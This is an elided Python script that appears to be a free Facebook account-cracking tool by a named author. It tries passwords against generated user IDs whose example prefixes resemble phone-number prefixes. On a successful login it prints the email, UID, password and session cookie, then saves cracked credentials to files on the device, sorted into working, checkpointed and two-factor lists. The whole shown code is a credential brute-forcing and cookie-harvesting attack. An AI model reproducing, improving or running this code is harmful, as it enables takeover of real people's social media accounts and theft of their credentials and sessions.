...
[�] AUTHOR       : TOAVINA THIERCK
[�] GITHUB        : https://github.com/Toavina-Mg
[�] STATUS       : FREE
------------------------------------------
[�] TOOL TYPE : RANDOM
[�] VERSION     : 1.0         
...
def Random():
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE : [0;m]")
    print(f"")
    print(f"017 ,018 ")
    print(f" 9378 ,9379 ")
    print(f" 0321 ,0316")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\r\033[1;32m[√]---------------------[RATOU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/Toavina-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[141:156]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[RATOU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/Toavina-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Toavina-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[TOAVINA] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
